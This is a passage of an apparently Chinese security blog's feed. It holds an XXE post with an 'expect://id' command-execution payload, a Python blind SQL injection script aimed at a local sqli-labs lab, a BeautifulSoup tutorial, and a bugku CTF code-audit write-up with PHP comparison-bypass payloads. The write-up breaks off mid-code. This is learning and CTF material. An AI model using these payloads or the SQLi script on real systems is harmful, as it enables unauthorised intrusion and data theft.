&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>xml命令执行需要php有expect扩展，但是默认没有，比较难利用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;&amp;xxe;&lt;/note&gt;</span><br></pre></td></tr></table></figure></p><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><h2 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h2><p>刚开始测试的时候，我用的是php5.6一直不能引用外部实体，后来发现php5.5以下的才能够成功。网上很多文章都没有提到，很多直接介绍xml和xxe，所以复现起来老是失败，后来在网上找到一个回答可以参考一下</p><blockquote><p>以上测试在php5.4一下包括5.4是成功的，php5.5及以上是不成功的。可能的原因是5.5以上版本后，simplexml_load_string()、DOMDocument::loadxml()等不解析外部实体导致都不到文件还是因为libxml2版本的问题，还是高版本的php本身默认不解析外部实体呢，还是其他神恶魔原因呢？如果是因为php本身问题，那么XXE的利用范围也太过小了吧，应该不是这样的。。但是讲道理网上的资料太老了吧，估计也是参考别人的自己没有试验吧，等有空再做实验看看是什么问题。<br>今天在弄phith0n的vulhub的时候，无意间看到php-xxe的项目，得到了我想要的结果。XXE的利用跟php版本没有关系，而是xmllib的版本问题，xmllib2.9.0以后，是默认不解析外部实体的。</p></blockquote><p>还有一个坑就是，无回显直接传输内容可能会失败，用php流传输比较好。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;xml是什么&quot;&gt;&lt;a href=&quot;#xml是什么&quot; class=&quot;headerlink&quot; title=&quot;xml是什么&quot;&gt;&lt;/a&gt;xml是什么&lt;/h2&gt;&lt;p&gt;XML指可扩展标记语言&lt;br&gt;用处：被设计用来传输和存储数据。&lt;br&gt;与HTML区别：HTML是被设计用来显
      
    
    </summary>
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="other" scheme="http://yoursite.com/tags/other/"/>
    
  </entry>
  
  <entry>
    <title>Sqli-labs 盲注脚本编写</title>
    <link href="http://yoursite.com/2019/06/13/Sqli-labs%20%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/"/>
    <id>http://yoursite.com/2019/06/13/Sqli-labs 盲注脚本编写/</id>
    <published>2019-06-12T16:54:13.000Z</published>
    <updated>2019-06-12T16:54:15.998Z</updated>
    
    <content type="html"><![CDATA[<h2 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h2><p>1.初始化<br>设置数组范围，猜英文字符通常32~127，猜表长度通常50<br>2.当low&lt;=high进入循环<br>计算mid值，需要换算成整型<br>当所猜数小于mid<br>high指针左移为mid-1<br>当所猜数大于mid<br>low指针左移位mid+1<br>当low&gt;high时<br>输出list[high]则为最终结果</p><h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p>1.思路<br>构造payload：所猜数&lt;mid<br>判断条件，字符串如果在html中，那么就左移位，反之右移位<br>2.编写<br>先获得数据长度值，在根据长度获取具体值<br>我是编写两个函数<br>一个函数用来二分法求值，可求长度，或单个字符<br>第二个函数用来整合获取数据，循环每位字符得到字符串</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>python进行%赋值时，需要将%转义，二次%赋值尤其注意<br>如<code>%23</code>要变成<code>%%23</code></p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># payload: ?id=1&apos; and ascii(substr(database(),1,1))&gt;0 %23</span><br><span class="line"># len: ?id=1&apos; and length(database())&gt;0 %23</span><br><span class="line"># (select schema_name from information_schema.schemata limit 0,1)</span><br><span class="line">url = &quot;http://127.0.0.1/jishu1/sqli-labs-master/Less-5/&quot;;</span><br><span class="line">payload_len = &quot;?id=1&apos; and length(database())&lt;%d %%23&quot;</span><br><span class="line">payload = &quot;?id=1&apos; and ascii(substr(database(),%d,1))&lt;%%d %%%%23&quot;</span><br><span class="line">true_str = &quot;You are in&quot;</span><br><span class="line"></span><br><span class="line">html = requests.get(&quot;http://127.0.0.1/jishu1/sqli-labs-master/Less-5/?id&quot;)</span><br><span class="line"></span><br><span class="line">def getOneData(payload,flag=1):</span><br><span class="line">if flag==1:</span><br><span class="line">list = range(50)</span><br><span class="line">else:</span><br><span class="line">list = range(32,127)</span><br><span class="line">low = 0</span><br><span class="line">high = len(list)-1</span><br><span class="line">while low&lt;=high:</span><br><span class="line">mid = (int)((low+high)/2)</span><br><span class="line">guess = list[mid]</span><br><span class="line">print(list[low],guess,list[high])</span><br><span class="line">html = requests.get(url+payload % guess).text</span><br><span class="line">if true_str in html:</span><br><span class="line">high = mid - 1</span><br><span class="line">else:</span><br><span class="line">low = mid + 1</span><br><span class="line">if low &gt; high:</span><br><span class="line">return list[high]</span><br><span class="line"></span><br><span class="line">def getFlag(length,payload):</span><br><span class="line">result = &apos;&apos;</span><br><span class="line">for l in range(1,length+1):</span><br><span class="line">payload2 = payload % l</span><br><span class="line">result += chr(getOneData(payload2,2))</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">getFlag(getOneData(payload_len),payload)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;二分法&quot;&gt;&lt;a href=&quot;#二分法&quot; class=&quot;headerlink&quot; title=&quot;二分法&quot;&gt;&lt;/a&gt;二分法&lt;/h2&gt;&lt;p&gt;1.初始化&lt;br&gt;设置数组范围，猜英文字符通常32~127，猜表长度通常50&lt;br&gt;2.当low&amp;lt;=high进入循环&lt;br&gt;计
      
    
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/categories/Web/"/>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>BeautifulSoup解析</title>
    <link href="http://yoursite.com/2019/05/21/Beautifulsoup%E8%A7%A3%E6%9E%90/"/>
    <id>http://yoursite.com/2019/05/21/Beautifulsoup解析/</id>
    <published>2019-05-21T10:36:18.000Z</published>
    <updated>2019-05-21T10:39:21.572Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>一个节点可以由5个部分来概括</p><ul><li>节点名</li><li>节点内容</li><li>子节点</li><li>父亲节点</li><li>属性</li></ul><p>所以我们主要围绕两个问题：</p><ul><li>如何获得相应节点</li><li>如何从该节点获得我们需要的信息</li></ul><h2 id="获得节点"><a href="#获得节点" class="headerlink" title="获得节点"></a>获得节点</h2><p><code>soup.p</code>：获得第一个p标签节点<br><code>soup.find_all(&quot;p&quot;)</code>：获得所有p标签节点组成的list<br><code>soup.find(id=&quot;link3&quot;)</code>：通过id选择器获得指定节点</p><h2 id="获得信息"><a href="#获得信息" class="headerlink" title="获得信息"></a>获得信息</h2><p><code>soup.p.name</code>：获得节点名<br><code>soup.p.text</code>：获得节点文字内容包含子节点<br><code>soup.p.string</code>：获得节点文字内容<br><code>soup.p[&quot;class&quot;]</code>：获得属性内容<br><code>soup.p.get(&quot;class&quot;)</code>：获得属性内容<br><code>soup.p.get_text()</code>：获取文字内容</p><h2 id="Tag对象"><a href="#Tag对象" class="headerlink" title="Tag对象"></a>Tag对象</h2><p>用于找出节点的信息<br>1.获取名字<br><code>tag.name</code><br>2.获取属性<br><code>tag[&#39;id&#39;]</code><br><code>tag.attrs[&#39;id&#39;]</code><br><code>tag.get(&#39;id&#39;)</code><br>3.获得字符串<br><code>tag.string</code>：可以获得NavigableString类<br><code>tag.text</code>：获得普通str<br>4.获取子节点<br><code>tag.tag.tag</code>如<code>soup.body.b</code><br><code>soup.find_all(&#39;a&#39;)</code>遍历所有选择的子节点<br>5.获取子节点列表<br><code>tag.contents</code><br><code>tag.children</code>：子节点生成器<br>6.获取子孙节点<br><code>tag.descendants</code>：子孙节点生成器<br><code>tag.strings</code>：获得所有子孙节点的string生成器<br><code>tag.stripped_strings</code>：与上面功能相同，增加去除空格<br>7.获取父节点<br><code>tag.parent</code>：获取父亲节点<br><code>tag.parents</code>：获取父辈节点生成器<br>8.获取兄弟节点<br><code>tag.next_sibling</code>：获取兄弟节点，包括string<br><code>tag.previous_sibling</code><br><code>tag.next_siblings</code>：兄弟节点生成器<br><code>tag.previous_siblings</code></p><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>用于找到想要的节点<br><strong>find_all( name , attrs , recursive , text , **kwargs )</strong><br>1.通过name直接查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(&apos;b&apos;)</span><br><span class="line"># [&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;]</span><br></pre></td></tr></table></figure></p><p>2.正则表达式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for tag in soup.find_all(re.compile(&quot;^b&quot;)):</span><br><span class="line">    print(tag.name)</span><br><span class="line"># body</span><br><span class="line"># b</span><br></pre></td></tr></table></figure></p><p>3.构造器<br>如果没有合适的过滤器能够进行筛选，我们可以自己进行构造<br>如：要寻找class为title的p标签<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def class_title(tag):</span><br><span class="line">attr = tag.get(&apos;class&apos;)</span><br><span class="line">if attr != None:</span><br><span class="line">return attr[0] == &apos;title&apos;</span><br><span class="line">else:</span><br><span class="line">return False</span><br><span class="line"></span><br><span class="line">soup.find_all(class_title)</span><br><span class="line"># [&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&apos;s story&lt;/b&gt;&lt;/p&gt;]</span><br></pre></td></tr></table></figure></p><p>4.通过属性查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(href=re.compile(&quot;elsie&quot;), id=&apos;link1&apos;)</span><br><span class="line"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;three&lt;/a&gt;]</span><br></pre></td></tr></table></figure></p><p>5.通过字典搜索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data_soup.find_all(attrs=&#123;&quot;data-foo&quot;: &quot;value&quot;&#125;)</span><br><span class="line"># [&lt;div data-foo=&quot;value&quot;&gt;foo!&lt;/div&gt;]</span><br></pre></td></tr></table></figure></p><p>6.通过class搜索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">css_soup.find_all(&quot;p&quot;, class_=&quot;body strikeout&quot;)</span><br><span class="line"># [&lt;p class=&quot;body strikeout&quot;&gt;&lt;/p&gt;]</span><br></pre></td></tr></table></figure></p><p>7.通过text搜索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(text=&quot;Elsie&quot;)</span><br><span class="line"># [u&apos;Elsie&apos;]</span><br></pre></td></tr></table></figure></p><p>8.通过limit限制搜索数量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(&quot;a&quot;, limit=2)</span><br><span class="line"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span><br><span class="line">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]</span><br></pre></td></tr></table></figure></p><p>9.recursive 参数<br>调用tag的 find_all() 方法时,Beautiful Soup会检索当前tag的所有子孙节点,如果只想搜索tag的直接子节点,可以使用参数 recursive=False .<br>10.简写<br><code>soup.find_all()</code>等价于<code>soup()</code></p><h2 id="CSS选择器"><a href="#CSS选择器" class="headerlink" title="CSS选择器"></a>CSS选择器</h2><p><code>soup.select(#id)</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;一个节点可以由5个部分来概括&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;节点名&lt;/li&gt;
&lt;li&gt;节点内容&lt;/li&gt;
&lt;li&gt;子节点&lt;/li&gt;
&lt;li&gt;父亲
      
    
    </summary>
    
      <category term="编程" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="编程" scheme="http://yoursite.com/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>代码审计相关函数分析</title>
    <link href="http://yoursite.com/2019/05/13/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9A%84%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2019/05/13/代码审计的相关函数分析/</id>
    <published>2019-05-13T12:49:18.000Z</published>
    <updated>2019-05-13T12:50:25.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-GET"><a href="#0x01-GET" class="headerlink" title="0x01. \$_GET"></a>0x01. \$_GET</h2><p>$_GET函数经常是ctf解题入口，该函数可以传递数组<br>get.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump($_GET);</span><br></pre></td></tr></table></figure></p><p>(1) 传递多个值优先选择后一个值<br><img src="/img/1557406692081.png" alt="Alt text"><br>(2) 传递数组<br><img src="/img/1557406781122.png" alt="Alt text"><br>(3) array&gt;数字</p><p>附：$_POST同样有效</p><h2 id="0x02-extract"><a href="#0x02-extract" class="headerlink" title="0x02. extract"></a>0x02. extract</h2><p>将键名摘取为变量值，键值作为变量值</p><h2 id="0x03-strcmp"><a href="#0x03-strcmp" class="headerlink" title="0x03. strcmp"></a>0x03. strcmp</h2><p>传入数组返回Null</p><h2 id="0x04-strpos"><a href="#0x04-strpos" class="headerlink" title="0x04. strpos"></a>0x04. strpos</h2><p>传入数组返回null</p><h2 id="0x05-ereg"><a href="#0x05-ereg" class="headerlink" title="0x05. ereg"></a>0x05. ereg</h2><p>传入数组返回null</p><h2 id="0x06-is-numeric"><a href="#0x06-is-numeric" class="headerlink" title="0x06. is_numeric"></a>0x06. is_numeric</h2><p>可以传入<code>&#39;数字+字母&#39;</code>绕过判断，如<code>&#39;123a&#39;</code>比较可被当成数字，即<code>&#39;123a&#39;&gt;&#39;123&#39;</code></p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07. {}"></a>0x07. {}</h2><p>选取字符串中的字符可用{}进行选取，如\$str = ‘abc’，那么$str{1}即为a</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-GET&quot;&gt;&lt;a href=&quot;#0x01-GET&quot; class=&quot;headerlink&quot; title=&quot;0x01. \$_GET&quot;&gt;&lt;/a&gt;0x01. \$_GET&lt;/h2&gt;&lt;p&gt;$_GET函数经常是ctf解题入口，该函数可以传递数组&lt;br&gt;get.php
      
    
    </summary>
    
      <category term="web" scheme="http://yoursite.com/categories/web/"/>
    
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>bugku代码审计wp</title>
    <link href="http://yoursite.com/2019/05/13/bugku%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1wp/"/>
    <id>http://yoursite.com/2019/05/13/bugku代码审计wp/</id>
    <published>2019-05-13T12:44:23.000Z</published>
    <updated>2019-05-13T12:44:46.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-extract变量覆盖"><a href="#0x01-extract变量覆盖" class="headerlink" title="0x01. extract变量覆盖"></a>0x01. extract变量覆盖</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$flag=&apos;xxx&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($shiyan))</span><br><span class="line">&#123;</span><br><span class="line">$content=trim(file_get_contents($flag));</span><br><span class="line">if($shiyan==$content)</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;flag&#123;xxx&#125;&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo&apos;Oh.no&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>\$shiyan和$flag变量由<code>extract</code>变量覆盖进行控制<br>$content变量由<code>file_get_contents</code>函数通过<code>php://input</code>进行控制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/1.php?shiyan=1&amp;flag=php://input</span><br><span class="line">1</span><br></pre></td></tr></table></figure></p><h2 id="0x02-strcmp比较字符串"><a href="#0x02-strcmp比较字符串" class="headerlink" title="0x02. strcmp比较字符串"></a>0x02. strcmp比较字符串</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;flag&#123;xxxxx&#125;&quot;;</span><br><span class="line">if (isset($_GET[&apos;a&apos;])) &#123;</span><br><span class="line">if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="line">//比较两个字符串（区分大小写）</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;No&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>strcmp</code>函数遇到数组后，会出错返回null，而<code>null==0</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/6.php?a[]</span><br></pre></td></tr></table></figure></p><h2 id="0x03-urldecode二次编码绕过"><a href="#0x03-urldecode二次编码绕过" class="headerlink" title="0x03. urldecode二次编码绕过"></a>0x03. urldecode二次编码绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">echo(&quot;</span><br><span class="line"></span><br><span class="line">not allowed!</span><br><span class="line"></span><br><span class="line">&quot;);</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">$_GET[id] = urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">echo &quot;</span><br><span class="line">Access granted!</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">echo &quot;</span><br><span class="line">flag</span><br><span class="line"></span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二次编码绕过</p><h2 id="0x04-md5-函数"><a href="#0x04-md5-函数" class="headerlink" title="0x04. md5()函数"></a>0x04. md5()函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">if (isset($_GET[&apos;username&apos;]) and isset($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">if ($_GET[&apos;username&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">print &apos;Your password can not be your username.&apos;;</span><br><span class="line">else if (md5($_GET[&apos;username&apos;]) === md5($_GET[&apos;password&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">print &apos;Invalid password&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入数组绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></p><h2 id="0x05-数组返回NULL绕过"><a href="#0x05-数组返回NULL绕过" class="headerlink" title="0x05. 数组返回NULL绕过"></a>0x05. 数组返回NULL绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line"></span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">echo &apos;You password must be alphanumeric&apos;;</span><br><span class="line">else if (strpos ($_GET[&apos;password&apos;], &apos;--&apos;) !== FALSE)</span><br><span class="line">die(&apos;Flag: &apos; . $flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;Invalid password&apos;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>ereg传入数组返回null，strpos传入数组返回null<br>paload: ?password[]</p><h2 id="0x06-弱类型整数大小比较绕过"><a href="#0x06-弱类型整数大小比较绕过" class="headerlink" title="0x06. 弱类型整数大小比较绕过"></a>0x06. 弱类型整数大小比较绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$temp = $_GET[&apos;password&apos;];</span><br><span class="line">is_numeric($temp)?die(&quot;no numeric&quot;):NULL;</span><br><span class="line">if($temp&gt;1336)&#123;</span><br><span class="line">echo $flag;</span><br></pre></td></tr></table></figure><p>传入’1337a’可以绕过is_numeric</p><h2 id="0x07-sha-函数比较绕过"><a href="#0x07-sha-函数比较绕过" class="headerlink" title="0x07. sha()函数比较绕过"></a>0x07. sha()函数比较绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$flag = &quot;flag&quot;;</span><br><span class="line">if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">var_dump($_GET[&apos;name&apos;]);</span><br><span class="line">echo &quot;</span><br><span class="line">&quot;;</span><br><span class="line">var_dump($_GET[&apos;password&apos;]);</span><br><span class="line">var_dump(sha1($_GET[&apos;name&apos;]));</span><br><span class="line">var_dump(sha1($_GET[&apos;password&apos;]));</span><br><span class="line">if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])</span><br><span class="line">echo &apos;</span><br><span class="line"></span><br><span class="line">Your password can not be your name!</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))</span><br><span class="line">die(&apos;Flag: &apos;.$flag);</span><br><span class="line">else</span><br><span class="line">echo &apos;</span><br><span class="line">Invalid password.</span><br><span class="line"></span><br><span class="line">&apos;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">echo &apos;</span><br><span class="line">Login first!</span><br><span class="line"></span><br><span class="line">&apos;;</span><br></pre></td></tr></table></figure><p>哈希算法，传入数组返回null<br>payload:?name[]=1&amp;password[]=2</p><h2 id="0x08-md5加密相等绕过"><a href="#0x08-md5加密相等绕过" class="headerlink" title="0x08. md5加密相等绕过"></a>0x08. md5加密相等绕过</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$md51 = md5(&apos;QNKCDZO&apos;);</span><br><span class="line">$a = @$_GET[&apos;a&apos;];</span><br><span class="line">$md52 = @md5($a);</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) &#123;</span><br><span class="line">echo &quot;flag&#123;*&#125;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo &quot;false!!!&quot;;</span><br><span class="line">&#125;&#125;</span><br><span class="line">else&#123;echo &quot;please input a&quot;;&#125;</span><br></pre></td></tr></table></figure><p>QNKCDZO的哈希值为0e830400451993494058024219903391<br>s878926199a的哈希值为0e545993274517709034328855841020<br>php弱类型 ‘0e数字’ == ‘0e数字’<br>payload:?a=s878926199a</p><h2 id="0x09-十六进制与数字比较"><a href="#0x09-十六进制与数字比较" class="headerlink" title="0x09. 十六进制与数字比较"></a>0x09. 十六进制与数字比较</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">function noother_says_correct($temp)</span><br><span class="line">&#123;</span><br><span class="line">$flag = &apos;flag&#123;test&#125;&apos;;</span><br><span class="line">$one = ord(&apos;1&apos;); //ord — 返回字符的 ASCII 码值</span><br><span class="line">$nine = ord(&apos;9&apos;); //ord — 返回字符的 